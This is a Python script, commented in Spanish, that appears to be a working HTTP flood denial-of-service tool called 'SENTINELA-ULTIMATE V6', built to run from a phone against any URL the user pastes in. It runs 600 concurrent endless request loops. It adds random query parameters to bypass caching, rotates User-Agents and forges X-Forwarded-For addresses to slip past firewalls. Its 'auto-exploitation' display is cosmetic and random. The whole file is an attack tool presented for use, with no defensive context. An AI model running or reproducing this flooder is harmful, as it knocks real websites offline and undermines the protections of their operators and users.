import asyncio
import aiohttp
import random
import os
import time
from colorama import Fore, Style, init

init()

# Identidades rotativas para penetrar cualquier firewall
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1"
]

async def asalto(url, session, id, logs):
    while True:
        try:
            # Bypass de caché dinámico para forzar al servidor a trabajar
            target_url = f"{url}?hack={random.randint(1,999999)}&token={random.getrandbits(32)}"
            headers = {
                'User-Agent': random.choice(UAS),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Cache-Control': 'no-cache'
            }
            
            # Control de flujo para no trabar el Tecno Spark
            await asyncio.sleep(0.02) 
            
            async with session.get(target_url, headers=headers, timeout=2) as r:
                logs['enviados'] += 1
                # Auto-Explotación silenciosa
                if r.status == 200 and random.random() < 0.05:
                    logs['explotación'] = "BUSCANDO ENTRADA..."
        except:
            logs['caídos'] += 1

async def visual_monitor(logs):
    while True:
        await asyncio.sleep(1)
        os.system('clear')
        print(f"{Fore.RED}{Style.BRIGHT}██ SENTINELA-ULTIMATE V6: ESTADO DESPIADADO ██")
        print(f"{Fore.GREEN}[+] IMPACTOS ENVIADOS: {logs['enviados']}")
        print(f"{Fore.YELLOW}[!] RECHAZADOS/COLAPSADOS: {logs['caídos']}")
        print(f"{Fore.CYAN}[*] AUTO-EXPLOTACIÓN: {logs['explotación']}")
        print(f"{Fore.WHITE}----------------------------------------------")

async def main():
    os.system('clear')
    print(f"{Fore.RED}##############################################")
    print("#      SISTEMA DE ASALTO TOTAL ELISANDRO     #")
    print("##############################################")
    
    print(f"\n{Fore.YELLOW}↓↓↓ PEGA EL ENLACE DEL OBJETIVO Y DALE A ENTER ↓↓↓")
    target = input(f"{Fore.CYAN}URL: {Style.RESET_ALL}").strip()
    
    if not target.startswith("http"):
        print(f"{Fore.RED}[!] ERROR: URL INVÁLIDA.")
        return

    logs = {'enviados': 0, 'caídos': 0, 'explotación': 'INACTIVO'}
    
    # Optimizamos a 600 conexiones para estabilidad total en tu móvil
    connector = aiohttp.TCPConnector(limit=600, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        asyncio.create_task(visual_monitor(logs))
        tasks = [asalto(target, session, i, logs) for i in range(600)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] ATAQUE ABORTADO POR EL OPERADOR.")
